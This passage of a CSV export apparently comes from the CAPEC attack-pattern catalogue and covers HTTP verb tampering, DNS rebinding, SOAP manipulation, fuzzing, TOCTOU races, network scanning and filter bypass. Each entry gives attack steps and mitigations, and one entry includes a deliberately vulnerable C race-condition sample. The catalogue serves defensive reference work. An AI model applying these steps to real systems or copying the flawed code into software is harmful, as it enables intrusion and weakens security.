interpreted in more than one way [REF-117].::::TYPE:Relationship:NOTE:HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against.::\",\n274,\"HTTP Verb Tampering\",Detailed,Draft,\"An attacker modifies the HTTP Verb (e.g. GET, PUT, TRACE, etc.) in order to bypass access restrictions. Some web environments allow administrators to restrict access based on the HTTP Verb used with requests. However, attackers can often provide a different HTTP Verb, or even provide a random string as a verb in order to bypass these protections. This allows the attacker to access data that should otherwise be protected.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:220::\",\"\",\"::The targeted system must attempt to filter access based on the HTTP verb used in requests.::\",\"\",\"::The attacker requires a tool that allows them to manually control the HTTP verb used to send messages to the targeted server.::\",\"\",\"\",\"::Design: Ensure that only legitimate HTTP verbs are allowed.::Design: Do not use HTTP verbs as factors in access decisions.::\",\"\",\"::302::654::\",\"\",\"\",\n275,\"DNS Rebinding\",Detailed,Draft,\"An adversary serves content whose IP address is resolved by a DNS server that the adversary controls. After initial contact by a web browser (or similar client), the adversary changes the IP address to which its name resolves, to an address within the target organization that is not publicly accessible. This allows the web browser to examine this internal address on behalf of the adversary.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:194::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify potential DNS rebinding targets] An adversary publishes content on their own server with their own name and DNS server. Attract HTTP traffic and explore rebinding vulnerabilities in browsers, flash players of old version.:TECHNIQUE:Adversary uses Web advertisements to attract the victim to access adversary's DNS. Explore the versions of web browser or flash players in HTTP request.::STEP:2:PHASE:Experiment:DESCRIPTION:[Establish initial target access to adversary DNS] The first time the target accesses the adversary's content, the adversary's name must be resolved to an IP address. The adversary's DNS server performs this resolution, providing a short Time-To-Live (TTL) in order to prevent the target from caching the value.::STEP:3:PHASE:Experiment:DESCRIPTION:[Rebind DNS resolution to target address] The target makes a subsequent request to the adversary's content and the adversary's DNS server must again be queried, but this time the DNS server returns an address internal to the target's organization that would not be accessible from an outside source.::STEP:4:PHASE:Experiment:DESCRIPTION:[Determine exploitability of DNS rebinding access to target address] The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the named internal addresses.::STEP:5:PHASE:Exploit:DESCRIPTION:[Access & exfiltrate data within the victim's security zone] The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the internal addresses. This allows adversaries to discover sensitive information about the internal network of an enterprise.:TECHNIQUE:Adversary attempts to use victim's browser as an HTTP proxy to other resources inside the target's security zone. This allows two IP addresses placed in the same security zone.:TECHNIQUE:Adversary tries to scan and access all internal hosts in victim's local network by sending multiple short-lived IP addresses.::\",\"::The target browser must access content server from the adversary controlled DNS name. Web advertisements are often used for this purpose. The target browser must honor the TTL value returned by the adversary and re-resolve the adversary's DNS name after initial contact.::\",\"::SKILL:Setup DNS server and the adversary's web server. Write a malicious script to allow the victim to connect to the web server.:LEVEL:Medium::\",\"::The adversary must serve some web content that a victim accesses initially. This content must include executable content that queries the adversary's DNS name (to provide the second DNS resolution) and then performs the follow-on attack against the internal system. The adversary also requires a customized DNS server that serves an IP address for their registered DNS name, but which resolves subsequent requests by a single client to addresses internal to that client's network.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Design: IP Pinning causes browsers to record the IP address to which a given name resolves and continue using this address regardless of the TTL set in the DNS response. Unfortunately, this is incompatible with the design of some legitimate sites.::Implementation: Reject HTTP request with a malicious Host header.::Implementation: Employ DNS resolvers that prevent external names from resolving to internal addresses.::\",\"::The adversary registers a domain name, such as www.evil.com with IP address 1.3.5.7, delegates it to their own DNS server (1.3.5.2), and uses phishing links or emails to get HTTP traffic. Instead of sending a normal TTL record, the DNS server sends a very short TTL record (for example, 1 second), preventing DNS response of entry[www.evil.com, 1.3.5.7] from being cached on victim's (192.168.1.10) browser. The adversary's server first responds to the victim with malicious script such as JavaScript, containing IP address (1.3.5.7) of the server. The adversary uses XMLHttpRequest (XHR) to send HTTP request or HTTPS request directly to the adversary's server and load response. The malicious script allows the adversary to rebind the host name to the IP address (192.168.1.2) of a target server that is behind the firewall. Then the server responds to the adversary's real target, which is an internal host IP (192.168.1.2) in the same domain of the victim (192.168.1.10). Because the same name resolves to both these IP addresses, browsers will place both IP addresses (1.3.5.7 and 192.168.1.2) in the same security zone and allow information to flow between the addresses. Further, the adversary can achieve scanning and accessing all internal hosts in the victim's local network (192.168.X.X) by sending multiple short-lived IP addresses.::\",\"::350::\",\"\",\"\",\n276,\"Inter-component Protocol Manipulation\",Standard,Draft,\"Inter-component protocols are used to communicate between different software and hardware modules within a single computer. Common examples are: interrupt signals and data pipes. Subverting the protocol can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:272::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"::707::\",\"\",\"\",\n277,\"Data Interchange Protocol Manipulation\",Standard,Draft,\"Data Interchange Protocols are used to transmit structured data between entities. These protocols are often specific to a particular domain (B2B: purchase orders, invoices, transport logistics and waybills, medical records). They are often, but not always, XML-based. Subverting the protocol can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:272::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"::707::\",\"\",\"\",\n278,\"Web Services Protocol Manipulation\",Standard,Draft,\"An adversary manipulates a web service related protocol to cause a web application or service to react differently than intended. This can either be performed through the manipulation of call parameters to include unexpected values, or by changing the called function to one that should normally be restricted or limited. By leveraging this pattern of attack, the adversary is able to gain access to data or resources normally restricted, or to cause the application or service to crash.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:272::\",\"\",\"::The targeted application or service must rely on web service protocols in such a way that malicious manipulation of them can alter functionality.::\",\"\",\"::The attacker must be able to manipulate the communications to the targeted application or service.::\",\"\",\"\",\"::Design: Range, size and value and consistency verification for any arguments supplied to applications and services from external sources and devise appropriate error response.::Design: Ensure that function calls that should not be called by an unprivileged user are not accessible to them.::\",\"\",\"::707::\",\"\",\"\",\n279,\"SOAP Manipulation\",Detailed,Draft,\"Simple Object Access Protocol (SOAP) is used as a communication protocol between a client and server to invoke web services on the server. It is an XML-based protocol, and therefore suffers from many of the same shortcomings as other XML-based protocols. Adversaries can make use of these shortcomings and manipulate the content of SOAP paramters, leading to undesirable behavior on the server and allowing the adversary to carry out a number of further attacks.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:278::NATURE:CanPrecede:CAPEC ID:110::NATURE:CanPrecede:CAPEC ID:228::\",\"::STEP:1:PHASE:Exploit:DESCRIPTION:[Find target application] The adversary needs to identify an application that uses SOAP as a communication protocol.:TECHNIQUE:Observe HTTP traffic to an application and look for SOAP headers.::STEP:2:PHASE:Experiment:DESCRIPTION:[Detect Incorrect SOAP Parameter Handling] The adversary tampers with the SOAP message parameters and looks for indications that the tampering caused a change in behavior of the targeted application.:TECHNIQUE:Send more data than would seem reasonable for a field and see if the server complains.:TECHNIQUE:Send nonsense data in a field that expects a certain subset, such as product names or sequence numbers, and see if the server complains.:TECHNIQUE:Send XML metacharacters as data and see how the server responds.::STEP:3:PHASE:Exploit:DESCRIPTION:[Manipulate SOAP parameters] The adversary manipulates SOAP parameters in a way that causes undesirable behavior for the server. This can result in denial of service, information disclosure, arbitrary code exection, and more.:TECHNIQUE:Create a recursive XML payload that will take up all of the memory on the server when parsed, resulting in a denial of service. This is known as the billion laughs attack.:TECHNIQUE:Insert XML metacharacters into data fields that could cause the server to go into an error state when parsing. This could lead to a denial of service.:TECHNIQUE:Insert a large amount of data into a field that should have a character limit, causing a buffer overflow.::\",\"::An application uses SOAP-based web service api.::An application does not perform sufficient input validation to ensure that user-controllable data is safe for an XML parser.::The targeted server either fails to verify that data in SOAP messages conforms to the appropriate XML schema, or it fails to correctly handle the complete range of data allowed by the schema.::\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"\",\"\",\"::707::\",\"\",\"\",\n28,\"Fuzzing\",Meta,Draft,\"In this attack pattern, the adversary leverages fuzzing to try to identify weaknesses in the system. Fuzzing is a software security and functionality testing method that feeds randomly constructed input to the system and looks for an indication that a failure in response to that input has occurred. Fuzzing treats the system as a black box and is totally free from any preconceptions or assumptions about the system. Fuzzing can help an attacker discover certain assumptions made about user input in the system. Fuzzing gives an attacker a quick way of potentially uncovering some of these assumptions despite not necessarily knowing anything about the internals of the system. These assumptions can then be turned against the system by specially crafting user input that may allow an attacker to achieve their goals.\",\"\",High,Medium,\"\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Observe communication and inputs] The fuzzing attacker observes the target system looking for inputs and communications between modules, subsystems, or systems.:TECHNIQUE:Network sniffing. Using a network sniffer such as wireshark, the attacker observes communications into and out of the target system.:TECHNIQUE:Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the attacker observes the system calls and API calls that are made by the target system, and the nature of their parameters.:TECHNIQUE:Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)::STEP:2:PHASE:Experiment:DESCRIPTION:[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.:TECHNIQUE:Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).:TECHNIQUE:Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system.::STEP:3:PHASE:Experiment:DESCRIPTION:[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if anything interesting happens. If failure occurs, determine why that happened. Figure out the underlying assumption that was invalidated by the input.::STEP:4:PHASE:Exploit:DESCRIPTION:[Craft exploit payloads] Put specially crafted input into the system that leverages the weakness identified through fuzzing and allows to achieve the goals of the attacker. Fuzzers often reveal ways to slip through the input validation filters and introduce unwanted data into the system.:TECHNIQUE:Identify and embed shell code for the target system.:TECHNIQUE:Embed higher level attack commands in the payload. (e.g., SQL, PHP, server-side includes, etc.):TECHNIQUE:Induce denial of service by exploiting resource leaks or bad error handling.::\",\"\",\"::SKILL:There is a wide variety of fuzzing tools available.:LEVEL:Low::\",\"::Fuzzing tools.::\",\"::A lot of invalid data is fed to the system. Data that cannot have been generated through a legitimate transaction/request. Data is coming into the system within a short period of time and potentially from the same IP.::\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Alter Execution Logic::\",\"::Test to ensure that the software behaves as per specification and that there are no unintended side effects. Ensure that no assumptions about the validity of data are made.::Use fuzz testing during the software QA process to uncover any surprises, uncover any assumptions or unexpected behavior.::\",\"::A fuzz test reveals that when data length for a particular field exceeds certain length, the input validation filter fails and lets the user data in unfiltered. This provides an attacker with an injection vector to deliver the malicious payload into the system.::\",\"::74::20::\",\"\",\"\",\n285,\"ICMP Echo Request Ping\",Detailed,Stable,\"An adversary sends out an ICMP Type 8 Echo Request, commonly known as a 'Ping', in order to determine if a target system is responsive. If the request is not blocked by a firewall or ACL, the target host will respond with an ICMP Type 0 Echo Reply datagram. This type of exchange is usually referred to as a 'Ping' due to the Ping utility present in almost all operating systems. Ping, as commonly implemented, allows a user to test for alive hosts, measure round-trip time, and measure the percentage of packet loss.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:292::\",\"\",\"::The ability to send an ICMP type 8 query (Echo Request) to a remote target and receive an ICMP type 0 message (ICMP Echo Reply) in response. Any firewalls or access control lists between the sender and receiver must allow ICMP Type 8 and ICMP Type 0 messages in order for a ping operation to succeed.::\",\"::SKILL:The adversary needs to know certain linux commands for this type of attack.:LEVEL:Low::\",\"::Scanners or utilities that provide the ability to send custom ICMP queries.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:A successful attack of this kind can identify open ports and available services on a system.::\",\"::Consider configuring firewall rules to block ICMP Echo requests and prevent replies. If not practical, monitor and consider action when a system has fast and a repeated pattern of requests that move incrementally through port numbers.::\",\"\",\"::200::\",\"\",\"\",\n287,\"TCP SYN Scan\",Detailed,Stable,\"An adversary uses a SYN scan to determine the status of ports on the remote target. SYN scanning is the most common type of port scanning that is used because of its many advantages and few drawbacks. As a result, novice attackers tend to overly rely on the SYN scan while performing system reconnaissance. As a scanning method, the primary advantages of SYN scanning are its universality and speed.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:300::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends SYN packets to ports they want to scan and checks the response without completing the TCP handshake.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine the port's state. The adversary can determine the state of a port based on the following responses. When a SYN is sent to an open port and unfiltered port, a SYN/ACK will be generated. When a SYN packet is sent to a closed port a RST is generated, indicating the port is closed. When SYN scanning to a particular port generates no response, or when the request triggers ICMP Type 3 unreachable errors, the port is filtered.::\",\"::This scan type is not possible with some operating systems (Windows XP SP 2). On Linux and Unix systems it requires root privileges to use raw sockets.::\",\"\",\"::The ability to send TCP SYN segments to a host during network reconnaissance via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:A successful attack of this kind can identify open ports and available services on a system.::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n29,\"Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions\",Standard,Draft,\"This attack targets a race condition occurring between the time of check (state) for a resource and the time of use of a resource. A typical example is file access. The adversary can leverage a file access race condition by running the race, meaning that they would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary could replace or modify the file, causing the application to behave unexpectedly.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:26::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:The adversary explores to gauge what level of access they have.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary confirms access to a resource on the target host. The adversary confirms ability to modify the targeted resource.::STEP:3:PHASE:Exploit:DESCRIPTION:The adversary decides to leverage the race condition by running the race, meaning that they would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary can replace the resource and cause an escalation of privilege.::\",\"::A resource is access/modified concurrently by multiple processes.::The adversary is able to modify resource.::A race condition exists while accessing a resource.::\",\"::SKILL:This attack can get sophisticated since the attack has to occur within a short interval of time.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Alter Execution Logic::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::\",\"::Use safe libraries to access resources such as files.::Be aware that improper use of access function calls such as chown(), tempfile(), chmod(), etc. can cause a race condition.::Use synchronization to control the flow of execution.::Use static analysis tools to find race conditions.::Pay attention to concurrency problems related to the access of resources.::\",\"::The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057::The following code illustrates a file that is accessed multiple times by name in a publicly accessible directory. A race condition exists between the accesses where an adversary can replace the file referenced by the name. include <sys/types.h>include <fcntl.h>include <unistd.h> define FILE /tmp/myfiledefine UID 100 void test(char *str){int fd;fd = creat(FILE, 0644);if(fd == -1)return; chown(FILE, UID, -1); /* BAD */close(fd); } int main(int argc, char **argv){char *userstr;if(argc > 1) {userstr = argv[1];test(userstr); }return 0; } [REF-107]::\",\"::367::368::366::370::362::662::691::663::665::\",\"\",\"\",\n290,\"Enumerate Mail Exchange (MX) Records\",Detailed,Stable,\"An adversary enumerates the MX records for a given via a DNS query. This type of information gathering returns the names of mail servers on the network. Mail servers are often not exposed to the Internet but are located within the DMZ of a network protected by a firewall. A side effect of this configuration is that enumerating the MX records for an organization my reveal the IP address of the firewall or possibly other internal systems. Attackers often resort to MX record enumeration when a DNS Zone Transfer is not possible.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:309::\",\"\",\"::The adversary requires access to a DNS server that will return the MX records for a network.::\",\"\",\"::A command-line utility or other application capable of sending requests to the DNS server is necessary.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n291,\"DNS Zone Transfers\",Detailed,Stable,\"An attacker exploits a DNS misconfiguration that permits a ZONE transfer. Some external DNS servers will return a list of IP address and valid hostnames. Under certain conditions, it may even be possible to obtain Zone data about the organization's internal network. When successful the attacker learns valuable information about the topology of the target organization, including information about particular servers, their role within the IT structure, and possibly information about the operating systems running upon the network. This is configuration dependent behavior so it may also be required to search out multiple DNS servers while attempting to find one with ZONE transfers allowed.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:309::\",\"\",\"::Access to a DNS server that allows Zone transfers.::\",\"\",\"::A client application capable of interacting with the DNS server or a command-line utility or web application that automates DNS interactions.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"\",\"\",\"::200::\",\"\",\"\",\n292,\"Host Discovery\",Standard,Stable,\"An adversary sends a probe to an IP address to determine if the host is alive. Host discovery is one of the earliest phases of network reconnaissance. The adversary usually starts with a range of IP addresses belonging to a target network and uses various methods to determine if a host is present at that IP address. Host discovery is usually referred to as 'Ping' scanning using a sonar analogy. The goal is to send a packet through to the IP address and solicit a response from the host. As such, a 'ping' can be virtually any crafted packet whatsoever, provided the adversary can identify a functional host based on its response. An attack of this nature is usually carried out with a 'ping sweep,' where a particular kind of ping is sent to a range of IP addresses.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary requires logical access to the target network in order to carry out host discovery.::\",\"\",\"::The resources required will differ based upon the type of host discovery being performed. Usually a network scanning tool or scanning script is required due to the volume of requests that must be generated.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1018:ENTRY NAME:Remote System Discovery::\",\"\",\n293,\"Traceroute Route Enumeration\",Detailed,Stable,\"An adversary uses a traceroute utility to map out the route which data flows through the network in route to a target destination. Tracerouting can allow the adversary to construct a working topology of systems and routers by listing the systems through which data passes through on their way to the targeted machine. This attack can return varied results depending upon the type of traceroute that is performed. Traceroute works by sending packets to a target while incrementing the Time-to-Live field in the packet header. As the packet traverses each hop along its way to the destination, its TTL expires generating an ICMP diagnostic message that identifies where the packet expired. Traditional techniques for tracerouting involved the use of ICMP and UDP, but as more firewalls began to filter ingress ICMP, methods of traceroute using TCP were developed.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:309::\",\"\",\"::A network capable of routing the attackers' packets to the destination network.::\",\"\",\"::A command line version of traceroute or similar tool that performs route enumeration.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::\",\"\",\"\",\"::200::\",\"\",\"\",\n294,\"ICMP Address Mask Request\",Detailed,Stable,\"An adversary sends an ICMP Type 17 Address Mask Request to gather information about a target's networking configuration. ICMP Address Mask Requests are defined by RFC-950, Internet Standard Subnetting Procedure. An Address Mask Request is an ICMP type 17 message that triggers a remote system to respond with a list of its related subnets, as well as its default gateway and broadcast address via an ICMP type 18 Address Mask Reply datagram. Gathering this type of information helps the adversary plan router-based attacks as well as denial-of-service attacks against the broadcast address.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:292::\",\"\",\"::The ability to send an ICMP type 17 query (Address Mask Request) to a remote target and receive an ICMP type 18 message (ICMP Address Mask Reply) in response. Generally, modern operating systems will ignore ICMP type 17 messages, however, routers will commonly respond to this request.::\",\"\",\"::The ability to send custom ICMP queries. This can be accomplished via the use of various scanners or utilities.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n295,\"Timestamp Request\",Detailed,Stable,\"This pattern of attack leverages standard requests to learn the exact time associated with a target system. An adversary may be able to use the timestamp returned from the target to attack time-based security algorithms, such as random number generators, or time-based authentication mechanisms.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:292::\",\"\",\"::The ability to send a timestamp request to a remote target and receive a response.::\",\"\",\"::Scanners or utilities that provide the ability to send custom ICMP queries.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::\",\"\",\"::An adversary sends an ICMP type 13 Timestamp Request to determine the time as recorded by a remote target. Timestamp Replies, ICMP Type 14, usually return a value in Greenwich Mean Time. An adversary can attempt to use an ICMP Timestamp requests to 'ping' a remote system to see if is alive. Additionally, because these types of messages are rare they are easily spotted by intrusion detection systems, many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 13 and egress ICMP type 14 messages.::An adversary may gather the system time or time zone from a local or remote system. This information may be gathered in a number of ways, such as with Net on Windows by performing net time hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz. The information could be useful for performing other techniques, such as executing a file with a Scheduled Task, or to discover locality information based on time zone to assist in victim targeting::\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1124:ENTRY NAME:System Time Discovery::\",\"\",\n296,\"ICMP Information Request\",Detailed,Stable,\"An adversary sends an ICMP Information Request to a host to determine if it will respond to this deprecated mechanism. ICMP Information Requests are a deprecated message type. Information Requests were originally used for diskless machines to automatically obtain their network configuration, but this message type has been superseded by more robust protocol implementations like DHCP.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:292::\",\"\",\"::The ability to send an ICMP Type 15 Information Request and receive an ICMP Type 16 Information Reply in response.::\",\"::SKILL:The adversary needs to know certain linux commands for this type of attack.:LEVEL:Low::\",\"::Scanners or utilities that provide the ability to send custom ICMP queries.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::\",\"\",\"\",\"::200::\",\"\",\"\",\n297,\"TCP ACK Ping\",Detailed,Stable,\"An adversary sends a TCP segment with the ACK flag set to a remote host for the purpose of determining if the host is alive. This is one of several TCP 'ping' types. The RFC 793 expected behavior for a service is to respond with a RST 'reset' packet to any unsolicited ACK segment that is not part of an existing connection. So by sending an ACK segment to a port, the adversary can identify that the host is alive by looking for a RST packet. Typically, a remote server will respond with a RST regardless of whether a port is open or closed. In this way, TCP ACK pings cannot discover the state of a remote port because the behavior is the same in either case. The firewall will look up the ACK packet in its state-table and discard the segment because it does not correspond to any active connection. A TCP ACK Ping can be used to discover if a host is alive via RST response packets sent from the host.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:292::\",\"\",\"::The ability to send an ACK packet to a remote host and identify the response. Creating the ACK packet without building a full connection requires the use of raw sockets. As a result, it is not possible to send a TCP ACK ping from some systems (Windows XP SP 2) without the use of third-party packet drivers like Winpcap. On other systems (BSD, Linux) administrative privileges are required in order to write to the raw socket.::The target must employ a stateless firewall that lacks a rule set that rejects unsolicited ACK packets.::The adversary requires the ability to craft custom TCP ACK segments for use during network reconnaissance. Sending an ACK ping requires the ability to access raw sockets in order to create the packets with direct access to the packet header.::\",\"\",\"::ACK scanning can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Leverage stateful firewalls that allow for the rejection of a packet that is not part of an existing connection.::\",\"\",\"::200::\",\"\",\"\",\n298,\"UDP Ping\",Detailed,Stable,\"An adversary sends a UDP datagram to the remote host to determine if the host is alive. If a UDP datagram is sent to an open UDP port there is very often no response, so a typical strategy for using a UDP ping is to send the datagram to a random high port on the target. The goal is to solicit an 'ICMP port unreachable' message from the target, indicating that the host is alive. UDP pings are useful because some firewalls are not configured to block UDP datagrams sent to strange or typically unused ports, like ports in the 65K range. Additionally, while some firewalls may filter incoming ICMP, weaknesses in firewall rule-sets may allow certain types of ICMP (host unreachable, port unreachable) which are useful for UDP ping attempts.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:292::\",\"\",\"::The adversary requires the ability to send a UDP datagram to a remote host and receive a response.::The adversary requires the ability to craft custom UDP Packets for use during network reconnaissance.::The target's firewall must not be configured to block egress ICMP messages.::\",\"\",\"::UDP pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Configure your firewall to block egress ICMP messages.::\",\"\",\"::200::\",\"\",\"\",\n299,\"TCP SYN Ping\",Detailed,Stable,\"An adversary uses TCP SYN packets as a means towards host discovery. Typical RFC 793 behavior specifies that when a TCP port is open, a host must respond to an incoming SYN synchronize packet by completing stage two of the 'three-way handshake' - by sending an SYN/ACK in response. When a port is closed, RFC 793 behavior is to respond with a RST reset packet. This behavior can be used to 'ping' a target to see if it is alive by sending a TCP SYN packet to a port and then looking for a RST or an ACK packet in response.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:292::\",\"\",\"::The ability to send a TCP SYN packet to a remote target. Depending upon the operating system, the ability to craft SYN packets may require elevated privileges.::\",\"::SKILL:The adversary needs to know how to craft and send protocol commands from the command line or within a tool.:LEVEL:Low::\",\"::SYN pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n3,\"Using Leading 'Ghost' Character Sequences to Bypass Input Filters\",Detailed,Draft,\"Some APIs will strip certain leading characters from a string of parameters. An adversary can intentionally introduce leading ghost characters (extra characters that don't affect the validity of the request at the API layer) that enable the input to pass the filters and therefore process the adversary's input. This occurs when the targeted API will accept input data in several syntactic forms and interpret it in the equivalent semantic way, while the filter does not take into account the full spectrum of the syntactic forms acceptable to the targeted API.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:267::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and injects various leading 'Ghost' character sequences to determine how to application filters them.:TECHNIQUE:Add additional characters to common sequences such as ../ to see how the application will 